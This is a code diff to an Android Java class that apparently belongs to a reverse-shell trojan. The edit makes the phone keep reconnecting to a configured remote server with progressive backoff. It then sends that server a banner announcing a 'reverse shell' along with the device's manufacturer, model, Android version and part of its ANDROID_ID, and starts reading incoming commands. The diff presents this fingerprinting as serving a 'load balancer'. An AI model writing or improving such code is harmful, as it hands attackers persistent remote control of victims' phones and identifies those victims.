@@ -74,31 +74,57 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
     @Override
     protected Void doInBackground(String... strings) {
         Socket socket = null;
+        String serverHost = strings.length > 0 ? strings[0] : config.IP;
+        String serverPort = strings.length > 1 ? strings[1] : config.port;
+        int retryCount = 0;
+        
         try {
-
             while(true){
-                Log.d(TAG,"trying");
+                Log.d(TAG, "Attempting to connect to " + serverHost + ":" + serverPort);
                 socket = new Socket();
+                
                 try{
-                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);
-                }catch (SocketTimeoutException | SocketException e){
-                    Log.d(TAG,"error - retrying in 5 seconds");
+                    // Connect with timeout
+                    socket.connect(new InetSocketAddress(serverHost, Integer.parseInt(serverPort)), config.CONNECTION_TIMEOUT);
+                    
+                    if(socket.isConnected()){
+                        Log.d(TAG, "Successfully connected to server");
+                        retryCount = 0; // Reset retry count on successful connection
+                        break;
+                    }
+                } catch (SocketTimeoutException | SocketException e){
+                    retryCount++;
+                    Log.d(TAG, "Connection failed (attempt " + retryCount + "): " + e.getMessage());
+                    
+                    // Progressive backoff - wait longer after multiple failures
+                    int waitTime = retryCount > config.MAX_RETRIES ? config.RETRY_DELAY * 3 : config.RETRY_DELAY;
+                    
+                    Log.d(TAG, "Retrying in " + (waitTime/1000) + " seconds...");
                     try {
-                        Thread.sleep(5000); // Wait 5 seconds before retrying
+                        Thread.sleep(waitTime);
                     } catch (InterruptedException ie) {
                         ie.printStackTrace();
                     }
                 }
-                if(socket.isConnected()){
-                    Log.d(TAG,"done");
-                    break;
-                }
             }
             out = new DataOutputStream(socket.getOutputStream());
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            String model = android.os.Build.MODEL+"\n";
-            String welcomeMess = "Hello there, welcome to reverse shell of "+model;
+            
+            // Create enhanced device identification for load balancer
+            String deviceId = android.provider.Settings.Secure.getString(
+                context.getContentResolver(), 
+                android.provider.Settings.Secure.ANDROID_ID
+            );
+            String model = android.os.Build.MODEL;
+            String manufacturer = android.os.Build.MANUFACTURER;
+            String androidVersion = android.os.Build.VERSION.RELEASE;
+            
+            // Format: "Hello there, welcome to reverse shell of [Manufacturer Model] [Android Version] [Device ID]"
+            String deviceInfo = manufacturer + " " + model + " (Android " + androidVersion + ") [ID:" + deviceId.substring(0, Math.min(8, deviceId.length())) + "]\n";
+            String welcomeMess = "Hello there, welcome to reverse shell of " + deviceInfo;
             out.write(welcomeMess.getBytes("UTF-8"));
+            
+            Log.d(TAG, "Device info sent: " + deviceInfo.trim());
             String line;
             while ((line = in.readLine()) != null)
             {
